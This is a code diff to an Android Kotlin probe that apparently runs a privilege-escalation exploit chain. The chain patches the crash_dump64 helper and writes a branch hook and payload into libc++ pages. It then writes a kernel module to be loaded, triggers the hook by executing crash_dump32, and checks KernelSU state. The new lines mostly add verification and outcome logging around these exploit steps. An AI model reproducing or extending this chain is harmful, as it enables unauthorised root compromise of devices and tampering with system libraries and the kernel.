@@ -1326,6 +1326,55 @@ object TypedBackendProbe {
     )
 
     /**
+     *  抽样回读一个刚写完的区域，并把**真的读回来且比中**的块数交给收尾账。
+     *
+     *  规则不新造：首块、每 [VerifySampling43284.EVERY_BLOCKS] 块（= 512 B）、末块 —— 与 native 写路径
+     *  的 `request.verify_every` 同一条。成功**不逐块**打行（日志粒度不因本段变化）；读不到/比不中
+     *  **逐块**打一行（失败行不受粒度门限，与 native 的规则一致），行形照 ref 的失败块：
+     *  `write result=failed i=<i> block=<b> off=0x<..> len=16 written=<n> verified=<n> reason=<name>`。
+     *
+     *  @param label         区域名（module / payload），只进日志。
+     *  @param regionIndex   ref 的 `i=`（本段按 1 记）。
+     *  @param image         期望字节（整段镜像）。
+     *  @param writtenBlocks 这一段已经记进收尾账的块数（失败行里的 `written=`）。
+     *  @param read          按块序号读回一块；null = 读不回来。
+     *  @param step          统一日志回调。
+     *  @return 真的读回来且比中的块数（进 `run.43284 finish:` 的 `verified=`）。
+     */
+    private fun verifySampled(
+        label: String,
+        regionIndex: Int,
+        image: ByteArray,
+        writtenBlocks: Int,
+        read: (Int) -> ByteArray?,
+        step: (String) -> Unit,
+    ): Int {
+        val totalBlocks = (image.size + Assembled43284.BLOCK - 1) / Assembled43284.BLOCK
+        val sample = VerifySampling43284.sample(
+            totalBlocks = totalBlocks,
+            expected = { index -> VerifySampling43284.blockAt(image, index) },
+            read = read,
+        )
+        val failed = sample.unreadable.map { index -> index to "verify-read-failed" } +
+            sample.mismatched.map { index -> index to "verify-mismatch" }
+        for ((index, reason) in failed.sortedBy { pair -> pair.first }) {
+            step(
+                "write result=failed i=" + regionIndex + " block=" + index +
+                    " off=0x" + java.lang.Long.toHexString(index.toLong() * Assembled43284.BLOCK.toLong()) +
+                    " len=" + Assembled43284.BLOCK + " written=" + writtenBlocks +
+                    " verified=" + sample.verified + " label=" + label + " reason=" + reason,
+            )
+        }
+        step(
+            "typed: verify sampled label=" + label + " planned=" + sample.planned +
+                " read=" + sample.returned + " verified=" + sample.verified +
+                " mismatch=" + sample.mismatched.size + " unreadable=" + sample.unreadable.size +
+                " of=" + totalBlocks,
+        )
+        return sample.verified
+    }
+
+    /**
      * 用 Assembled43284 走一遍最小闭环（独立会话）：建 → 初始化 → 开门 → 读块 → 收尾。
      *
      * 这一段刻意只用**包装类**（拼装在 Kotlin），native 侧一行未改 —— 它验证的是包装类本身可用。
@@ -1573,6 +1622,8 @@ object TypedBackendProbe {
         meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForPatch?.size ?: -1) + " (patch1)")
         val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, patchMaterial) else false
         meter.after("Assembled43284.writeImage", "ok=" + patchWrote + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
+        /* 收尾账：patch#1 是 crash_dump64 的 helper 段，整段写成功即 ref 的 crash_dump_patched。 */
+        finish.noteCrashDump(patchWrote)
         /* 对着上游核「旧页」：IV = 旧页 XOR 期望页，前提是"旧页"真是文件当前内容。
          * Kotlin 直读 crash_dump64 前 16 字节（我们对它可读 ✓），与经链子读回的对比。 */
         runCatching {
@@ -1731,6 +1782,8 @@ meter.after(
         " refusal=" + hook.lastRefusal,
 )
 hookPlanWordsForRestore = hookPlanWords
+/* 收尾账：计划拿到了没有（ref 的 hook_planned 说的是「资产准备好了」，不是「挂上了」）。 */
+finish.noteHookPlanned(hookPlanWords != null)
 /*
  * 写入前的**闭包校验**（本批之一，纯 Kotlin）：镜像区 / 载荷区 / 站点块必须都在载体里、互不重叠、
  * 站点块整块可写。参照 ghostlock-app-ref@5f184760 的
@@ -1765,10 +1818,12 @@ runCatching {
         step(checked.summary)
     } else {
         step("typed: " + checked.refusal)
+        finish.noteError(checked.refusal ?: "plan:refused")
     }
 }.onFailure { problem ->
     planGate = PlanCheck(false, "plan:check-refused", "plan: unavailable")
     step("typed: plan:check-refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+    finish.noteError("plan:check-refused")
 }
 /** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
  * older code left there aims 0xC short of the payload entry. Force the word to the one this run
@@ -1847,6 +1902,8 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
             }
             meter.after("Assembled43284.writeHook", "ok=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+            /* 收尾账：站点字写成功即 ref 的 hook（chain 的 applied 标志）。 */
+            finish.noteHookApplied(hookWrote, hook.lastRefusal)
             /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
             runCatching {
                 meter.before("Assembled43284.image", "role=ROLE_IMAGE_LANDING_PAYLOAD")
@@ -1867,6 +1924,8 @@ meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexStri
 val payloadWrote = if (planGate?.ok == true) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value)) else false
 meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+                    /* 收尾账：载荷真的落进 libc++ 页即 ref 的 hook_armed。 */
+                    finish.noteHookArmed(payloadWrote, hook.lastRefusal)
                     /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
                      * 写后复读并断言分支字已变（region.verify）。载荷没落地就绝不写站点。 */
                     if (payloadWrote && hookPlanWords != null && hookPlanWords.size >= 4) {
@@ -1949,6 +2008,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                     else -> {
                         step("module precheck: refused " + pre)
                         planGate = PlanCheck(false, "plan:module-precheck:" + pre, "")
+                        finish.noteError("plan:module-precheck:" + pre)
                     }
                 }
                 /*
@@ -1992,11 +2052,47 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(seq.value))
                 meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+                /*
+                 * 区域行（ref chain.cpp:213-221 的同一形状）：写之前先声明这一段写什么、验不验、能不能回滚。
+                 * 本路径 Kotlin 不持有 journal ⇒ rollback=0（native 的 journal 只在它自己的 outcome 行里）。
+                 */
+                if (planGate?.ok == true) {
+                    step(
+                        "write stage=region i=1 of=1 off=0x0 len=" + moduleBytes.size +
+                            " verify=1 rollback=0 label=module",
+                    )
+                }
                 meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + moduleBytes.size + " (module -> carrier)")
                 /* 闸门关着就不写模块：闭包没通过时写进去的模块也没有钩子会 insmod 它。 */
                 val moduleWrote = if (planGate?.ok == true) module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value)) else false
                 meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+                /*
+                 *  收尾账的 written/verified 只记**模块区**：
+                 *   - written：整段报成功才计块（失败段不猜半途块数 —— native 只在它自己的 outcome 行里知道）；
+                 *   - verified：写完后按 512 B 粒度（每 32 块）抽样回读，**只数真的读回来且比中**的块。
+                 *  这两点与 ref 的 blocks_written / blocks_verified（chain.cpp:315/334）同义，
+                 *  区别只在「谁去读」：ref 在写循环里读，我们写完之后用同一条规则补读（不改写路径）。
+                 */
+                if (moduleWrote) {
+                    finish.noteModuleWritten(moduleBytes.size)
+                    step(
+                        "write result=ok i=1 off=0x0 blocks=" + finish.moduleBlocks +
+                            " bytes=" + moduleBytes.size,
+                    )
+                    finish.noteSampled(
+                        verifySampled(
+                            label = "module",
+                            regionIndex = 1,
+                            image = moduleBytes,
+                            writtenBlocks = finish.written,
+                            read = { index -> module.readBlock(moduleDoor, index.toLong() * Assembled43284.BLOCK) },
+                            step = step,
+                        ),
+                    )
+                } else {
+                    finish.noteError("module-write:" + module.lastRefusal)
+                }
             /*
              * 判定实验：写报成功但目标偏移不变时，扫一遍邻近偏移。
              * 若**别处**变了 ⇒ 落错页（页面由 SA/seq 决定）；若**哪都没变** ⇒ 报文被丢（ICV/口径不符）。
@@ -2053,6 +2149,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                     " igniter=" + triggerSpec.igniterPath + " retries=" + triggerSpec.retries +
                     " refusal=" + hook.lastRefusal,
             )
+            /* 收尾账：ref 的 run.trigger fired=（触发调用成功，不是「终态成功」）。 */
+            finish.noteTrigger(triggerCode == 0)
+            if (triggerCode != 0) {
+                finish.noteHookError("trigger-refused")
+            }
             /*
              * 点火：任何使用 ostream 的 C++ 进程都会走到被钩的 sentry。点火者在 TriggerSpec43284 里给
              * （默认 crash_dump32：链接 libc++ ⇒ 走 ostream sentry；标签 u:object_r:crash_dump_exec:s0 ⇒
@@ -2066,7 +2167,10 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 }
                 meter.after("Runtime.exec", "exit=" + exit)
                 step("typed: detonate exit=" + exit)
-            }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
+            }.onFailure { problem ->
+                step("typed: detonate refused " + problem.javaClass.simpleName)
+                finish.noteError("detonate-refused:" + problem.javaClass.simpleName)
+            }
             /*
              * wait 统一口径（本批四项之二）：15000 ms / 40 ms / 5 次，先可读标记、再 /dev/dfm 第二判据。
              * 依据 ghostlock-app-ref@5f184760 的：
@@ -2100,6 +2204,12 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 "state=" + terminal + " (" + WaitPolicy43284.terminalName(terminal) + ") refusal=" + hook.lastRefusal,
             )
             step("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
+            /* 收尾账：ref 的 run.wait outcome= / terminus=（终态名与是否成功终态都取 WaitPolicy43284 的口径）。 */
+            finish.noteWait(
+                WaitPolicy43284.terminalName(terminal),
+                terminus = terminal == WaitPolicy43284.TERMINAL_SUCCESS,
+                incomplete = terminal == WaitPolicy43284.TERMINAL_INFLIGHT,
+            )
             /* ksud 状态（新目标：冷机下能看到 ksud 的状态）：纯只读，逐项如实报。 */
             runCatching {
                 /* app 读不了 /proc/modules（EACCES，Android 限制）⇒ 用能看到的三件事报 ksud 状态。 */
@@ -2134,6 +2244,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
         try {
             hookOutcome.onFailure { problem ->
                 step("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                finish.noteError("hook-refused:" + problem.javaClass.simpleName)
             }
         } finally {
         /*
@@ -2148,10 +2259,9 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
             val restoreSession = hookForRestore
             val restorePlan = hookPlanWordsForRestore?.let { words -> restoreSession?.planOf(words) }
             if (restoreSession == null || restorePlan == null) {
-                step(
-                    "typed: hook restore=false refusal=" +
-                        (if (restoreSession == null) "hook-session-absent" else "hook-plan-absent"),
-                )
+                val absent = if (restoreSession == null) "hook-session-absent" else "hook-plan-absent"
+                step("typed: hook restore=false refusal=" + absent)
+                finish.noteHookRestored(false, absent)
             } else {
                 meter.before(
                     "Assembled43284.restoreHook",
@@ -2172,12 +2282,15 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         " refusal=" + restoreSession.lastRefusal,
                 )
                 step("typed: hook restore=" + restored + " refusal=" + restoreSession.lastRefusal)
+                /* 收尾账：ref 的 hook_restored —— 无条件恢复段的**真实返回**，不是常量 true。 */
+                finish.noteHookRestored(restored, restoreSession.lastRefusal)
             }
         } catch (problem: Throwable) {
             step(
                 "typed: hook restore=false refusal=" +
                     problem.javaClass.simpleName + ":" + (problem.message ?: ""),
             )
+            finish.noteHookRestored(false, problem.javaClass.simpleName)
         }
         }
         step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
@@ -2206,6 +2319,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
         val closed = session.close()
         meter.after("Assembled43284.close", "ok=" + closed)
         step("typed: assembled 43284 close ok=" + closed)
+        /*
+         * 收尾账的最后一项：拆 Access / 拆 patch#1 落地 / 拆分步会话 / 关会话 —— 四项都报成功才算
+         * cleanup=1（比 ref 的 cleanup_ran「release 跑过」更严：拆不干净不会伪装成干净）。
+         */
+        finish.noteCleanup(patchAccessDestroy && patchTorn && stepTorn && stepDestroyed == 0 && closed)
     }
 
     /* ---- 43499 的哨兵参数（顺序＝D1 单表的顺序；只求值能走到该到的地方） ---- */
